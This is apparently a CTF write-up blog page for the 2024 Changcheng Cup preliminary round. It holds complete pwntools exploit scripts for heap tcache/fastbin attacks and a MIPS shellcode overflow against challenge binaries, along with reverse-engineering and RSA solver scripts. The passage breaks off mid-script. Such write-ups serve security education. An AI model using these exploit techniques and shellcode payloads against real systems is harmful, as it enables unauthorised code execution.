@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="viol1t">
+
+
+
+
+
+<title>2024年长城杯初赛wp | viol1t</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">viol1t</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/achievement">Achievement</a>
+                
+                    <a class="menu-item" href="/members">Members</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">viol1t</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/achievement">Achievement</a>
+                
+                    <a class="menu-item" href="/members">Members</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">2024年长城杯初赛wp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">viol1t</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">五月 13, 2024&nbsp;&nbsp;20:40:28</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/WP/">WP</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="kawayi"><a href="#kawayi" class="headerlink" title="kawayi"></a>kawayi</h3><p><code>tcache bin attack</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;192.168.17.148&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;5.exit&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;talk?&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;5.exit&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;write?&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;5.exit&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;5.exit&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">&#x27;\n1.&#x27;</span>)[:-<span class="number">3</span>][-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2a5</span>, <span class="number">0x4f302</span>, <span class="number">0x4f302</span>]</span><br><span class="line">ogg = one[<span class="number">1</span>] + libc_base</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x10</span>, p64(ogg))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x10</span>, p64(ogg))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="votestore"><a href="#votestore" class="headerlink" title="votestore"></a>votestore</h3><p><code>fastbin attack</code>，<code>ptr</code>往上<code>0x10</code>位置的变量随着<code>menu</code>中功能被调用的次数递增，递增到合适的数值绕过<code>fastbin</code>申请堆的大小验证</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment">#32位arch=‘i386’</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;192.168.17.148&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name, data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;name&#x27;</span>, name)</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;data&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">ptr = <span class="number">0x6010B0</span></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3d</span>):</span><br><span class="line">    edit(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(p64(<span class="number">0x06010A0</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">edit(p64(atoi_got), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ogg = libc_base + <span class="number">0xf0897</span></span><br><span class="line">edit(p64(ogg), p64(ogg))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="babymips"><a href="#babymips" class="headerlink" title="babymips"></a>babymips</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;big&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;192.168.17.148&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process([<span class="string">&#x27;./qemu-mips-static&#x27;</span>, file_name])</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="number">0x7ffff590</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.mips.linux.sh()</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(<span class="number">0x41CE10</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p32(<span class="number">0x4202F4</span>) + p32(<span class="number">0</span>) * <span class="number">2</span> + p32(<span class="number">0x426034</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x64</span> + shellcode</span><br><span class="line">r.sendline(p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="LoginToMe"><a href="#LoginToMe" class="headerlink" title="LoginToMe"></a>LoginToMe</h3><p>动调拿一下<code>seed</code>，简单<code>z3</code>爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">    x = Solver()</span><br><span class="line">    ans = []</span><br><span class="line">    s = [BitVec((<span class="string">&#x27;%d&#x27;</span> % i), <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">    x.add(s[<span class="number">0</span>]&amp;<span class="number">0xff</span>==i)</span><br><span class="line">    x.add((s[<span class="number">0</span>] &amp; <span class="number">0xffff</span>) * (s[<span class="number">0</span>] &gt;&gt; <span class="number">16</span>) == <span class="number">0x146E4C25</span></span><br><span class="line">          , (s[<span class="number">0</span>] &amp; <span class="number">0xffff</span>) + (s[<span class="number">0</span>] &gt;&gt; <span class="number">16</span>) == <span class="number">0x9A66</span></span><br><span class="line">          , s[<span class="number">1</span>] - s[<span class="number">2</span>] == <span class="number">0x3BF1F3FD</span></span><br><span class="line">          , (s[<span class="number">1</span>] &amp; <span class="number">0xffff</span>) + (s[<span class="number">1</span>] &gt;&gt; <span class="number">16</span>) == <span class="number">56269</span></span><br><span class="line">          , (s[<span class="number">2</span>] &amp; <span class="number">0xffff</span>) - (s[<span class="number">2</span>] &gt;&gt; <span class="number">16</span>) == <span class="number">15092</span></span><br><span class="line">          , ((s[<span class="number">1</span>] &amp; <span class="number">0xffff</span>) &amp; <span class="number">0xff</span>) * ((s[<span class="number">2</span>] &amp; <span class="number">0xffff</span>) &amp; <span class="number">0xff</span>) == <span class="number">10710</span></span><br><span class="line">          , ((s[<span class="number">1</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) * ((s[<span class="number">2</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) == <span class="number">12051</span></span><br><span class="line">          , ((s[<span class="number">1</span>] &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">8</span>) + ((s[<span class="number">2</span>] &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">8</span>) == <span class="number">172</span></span><br><span class="line">          , (s[<span class="number">3</span>] &amp; <span class="number">0xffff</span>) * (s[<span class="number">3</span>] &gt;&gt; <span class="number">16</span>) == <span class="number">171593250</span></span><br><span class="line">          , (s[<span class="number">3</span>] &amp; <span class="number">0xffff</span>) + (s[<span class="number">3</span>] &gt;&gt; <span class="number">16</span>) == <span class="number">26219</span></span><br><span class="line">          , (s[<span class="number">4</span>] &amp; <span class="number">0xffff</span>) * (s[<span class="number">4</span>] &gt;&gt; <span class="number">16</span>) == <span class="number">376306868</span></span><br><span class="line">          , (s[<span class="number">4</span>] &amp; <span class="number">0xffff</span>) + (s[<span class="number">4</span>] &gt;&gt; <span class="number">16</span>) == <span class="number">40341</span>)</span><br><span class="line">    <span class="keyword">if</span> x.check() == sat:</span><br><span class="line">        model = x.model()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">             ans.append(model[s[i]].as_long().real)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">         <span class="built_in">print</span>(libnum.n2s(i)[::-<span class="number">1</span>].decode(),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ans!=[]:</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
+
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="你真的了解RSA吗"><a href="#你真的了解RSA吗" class="headerlink" title="你真的了解RSA吗"></a>你真的了解RSA吗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#step1</span></span><br><span class="line">p = <span class="number">3570689330324393</span></span><br><span class="line">q = <span class="number">8539449885098290729</span></span><br><span class="line">c = <span class="number">11499128260801730440456056246212361</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">n=p*q</span><br><span class="line">fn=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,fn)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="string">b&#x27;flag&#123;p*q*r*s_&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>step2</code>部分，直接分解<code>int(n)</code> <a target="_blank" rel="noopener" href="http://www.factordb.com/">http://www.factordb.com/</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">1235542029039790988583258906019</span></span><br><span class="line">q=<span class="number">1235542029039790988583258906103</span></span><br><span class="line">s=<span class="number">1235542029039790988583258906107</span></span><br><span class="line">r=<span class="number">1235542029039790988583258906163</span></span><br><span class="line">e=e=<span class="number">0x10001</span></span><br><span class="line">c= <span class="number">0x8a20cca012e973b2a8ca161bd1e82804714cc75bd1238f8579cc7a5143c8bb955320b8c2811dc98a4547e9f4fe856e039630</span></span><br><span class="line">n=p*q*s*r</span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)*(s-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">d=invert(e,phi_n)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="string">b&#x27;32cacb2f994f6b42183a1300d9a3e8d6&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><p>将<code>b.txt</code>文件放到<code>sage</code>所在系统，命名为<code>lxz.txt</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gravity</span>(<span class="params">n,d=<span class="number">0.25</span></span>):</span><br><span class="line">    A=np.zeros([n,n])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            A[i,j]=d/n*(d**<span class="number">2</span>+((i-j)/n)**<span 